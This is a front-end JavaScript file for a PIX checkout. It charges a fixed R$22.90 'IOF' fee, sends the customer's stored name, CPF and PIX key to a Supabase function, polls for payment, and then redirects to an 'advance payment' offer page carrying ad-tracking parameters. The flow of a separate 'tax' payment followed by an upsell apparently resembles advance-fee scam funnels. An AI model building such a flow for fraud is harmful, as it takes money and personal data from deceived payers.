const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_ANON_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

const IOF_AMOUNT = 22.90;

let pixData = null;
let paymentCheckInterval = null;

document.addEventListener('DOMContentLoaded', function () {
  const checkbox = document.getElementById('iof-terms-checkbox');
  const payButton = document.getElementById('iof-pay-button');
  const backButton = document.getElementById('pix-back-button');
  const copyButton = document.getElementById('pix-copy-button');

  checkbox.addEventListener('change', function () {
    if (this.checked) {
      payButton.disabled = false;
      payButton.classList.remove('iof-button-disabled');
    } else {
      payButton.disabled = true;
      payButton.classList.add('iof-button-disabled');
    }
  });

  payButton.addEventListener('click', async function () {
    if (!checkbox.checked) {
      return;
    }

    await generateAndShowPix();
  });

  backButton.addEventListener('click', function () {
    hidePixScreen();
  });

  copyButton.addEventListener('click', function () {
    const pixCodeInput = document.getElementById('pix-code-input');
    const copiedText = document.getElementById('pix-code-copied');

    pixCodeInput.select();
    document.execCommand('copy');

    navigator.clipboard.writeText(pixCodeInput.value).then(() => {
      copiedText.style.display = 'block';

      setTimeout(() => {
        copiedText.style.display = 'none';
      }, 3000);
    }).catch(err => {
      console.error('Erro ao copiar:', err);
      alert('Código copiado para a área de transferência!');
    });
  });
});

async function generateAndShowPix() {
  const iofScreen = document.getElementById('iof-screen');
  const pixScreen = document.getElementById('pix-screen');
  const preloaderContainer = pixScreen.querySelector('.pix-preloader-container');
  const paymentWrapper = pixScreen.querySelector('.pix-payment-wrapper');

  iofScreen.style.display = 'none';
  pixScreen.style.display = 'block';
  preloaderContainer.style.display = 'flex';
  paymentWrapper.style.display = 'none';

  try {
    const customerData = getCustomerDataFromStorage();

    const apiUrl = `${SUPABASE_URL}/functions/v1/create-pix`;

    const headers = {
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      'Content-Type': 'application/json',
    };

    const payload = {
      customerName: customerData.nome || 'Cliente',
      customerEmail: customerData.email || 'cliente@email.com',
      customerPhone: customerData.telefone || '11999999999',
      customerDocument: customerData.cpf || customerData.chavePix || '00000000000',
      pixKey: customerData.chavePix || '',
      pixKeyType: customerData.tipoChave || 'cpf',
      transactionType: 'iof',
      amount: Math.round(IOF_AMOUNT * 100)
    };

    const response = await fetch(apiUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify(payload)
    });

    const data = await response.json();

    if (!response.ok || !data.success) {
      throw new Error(data.error || 'Erro ao criar PIX');
    }

    pixData = data;

    displayPixQRCode(data.qrcode, data.transactionId);

    preloaderContainer.style.display = 'none';
    paymentWrapper.style.display = 'flex';

    startPaymentCheck(data.transactionId);
  } catch (error) {
    console.error('Erro ao gerar PIX:', error);
    alert('Erro ao gerar PIX. Tente novamente.');
    hidePixScreen();
  }
}

function displayPixQRCode(qrcodeText, transactionId) {
  const qrcodeContainer = document.getElementById('pix-qrcode');
  const pixCodeInput = document.getElementById('pix-code-input');

  qrcodeContainer.innerHTML = '';

  if (window.QRCode) {
    new QRCode(qrcodeContainer, {
      text: qrcodeText,
      width: 250,
      height: 250,
      colorDark: '#000000',
      colorLight: '#ffffff',
      correctLevel: QRCode.CorrectLevel.H
    });
  }

  pixCodeInput.value = qrcodeText;
}

function startPaymentCheck(transactionId) {
  if (paymentCheckInterval) {
    clearInterval(paymentCheckInterval);
  }

  let attempts = 0;
  const maxAttempts = 120;

  paymentCheckInterval = setInterval(async () => {
    attempts++;

    try {
      const apiUrl = `${SUPABASE_URL}/functions/v1/check-payment`;
      const headers = {
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Content-Type': 'application/json',
      };

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers,
        body: JSON.stringify({ transactionId })
      });

      const data = await response.json();

      if (data.status === 'paid' || data.status === 'approved') {
        clearInterval(paymentCheckInterval);
        handlePaymentSuccess();
      }

      if (attempts >= maxAttempts) {
        clearInterval(paymentCheckInterval);
      }
    } catch (error) {
      console.error('Erro ao verificar pagamento:', error);
    }
  }, 5000);
}

function handlePaymentSuccess() {
  function herdarUTMeRedirecionar(urlDestino) {
    const urlAtual = new URL(window.location.href);
    const params = new URLSearchParams(urlAtual.search);

    const parametrosParaHerdar = {};
    for (const [key, value] of params.entries()) {
      if (
        key.startsWith("utm_") ||
        key === "ttclid"
      ) {
        parametrosParaHerdar[key] = value;
      }
    }

    const urlFinal = new URL(urlDestino, window.location.origin);
    const paramsDestino = new URLSearchParams(urlFinal.search);

    for (const [key, value] of Object.entries(parametrosParaHerdar)) {
      paramsDestino.set(key, value);
    }

    urlFinal.search = paramsDestino.toString();

    window.location.href = urlFinal.toString();
  }

  herdarUTMeRedirecionar('./oferta-antecipacao.html');
}

function hidePixScreen() {
  const iofScreen = document.getElementById('iof-screen');
  const pixScreen = document.getElementById('pix-screen');

  if (paymentCheckInterval) {
    clearInterval(paymentCheckInterval);
  }

  pixScreen.style.display = 'none';
  iofScreen.style.display = 'block';
}

function getCustomerDataFromStorage() {
  const storageKeys = ['customerData', 'pixFormData', 'userData'];

  for (const key of storageKeys) {
    const data = localStorage.getItem(key);
    if (data) {
      try {
        return JSON.parse(data);
      } catch (e) {
        console.error(`Erro ao parsear ${key}:`, e);
      }
    }
  }

  return {
    nome: 'Cliente',
    email: 'cliente@email.com',
    telefone: '11999999999',
    cpf: '00000000000',
    chavePix: '',
    tipoChave: 'cpf'
  };
}
